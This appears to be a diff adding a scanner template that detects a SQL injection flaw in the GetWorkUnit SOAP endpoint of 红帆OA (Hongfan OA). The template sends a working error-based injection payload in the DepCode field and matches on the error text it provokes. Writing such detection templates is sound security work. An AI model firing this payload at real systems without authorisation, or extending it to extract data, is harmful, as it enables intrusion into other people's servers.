@@ -1,0 +1,38 @@
+id: poc-yaml-hongfan-oa-getworkunit-sqli
+info:
+  name: 红帆OA GetWorkUnit SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in 红帆OA GetWorkUnit endpoint.
+variables:
+  t1: "{{rand_int(1000, 9999)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/interface/GetWorkUnit.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetDutyDetail xmlns="http://tempuri.org/">
+              <DepCode>1' and sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}'))>0;--</DepCode>
+              <DutyDate>string</DutyDate>
+              <DutyName>string</DutyName>
+            </GetDutyDetail>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "{{t2}}"
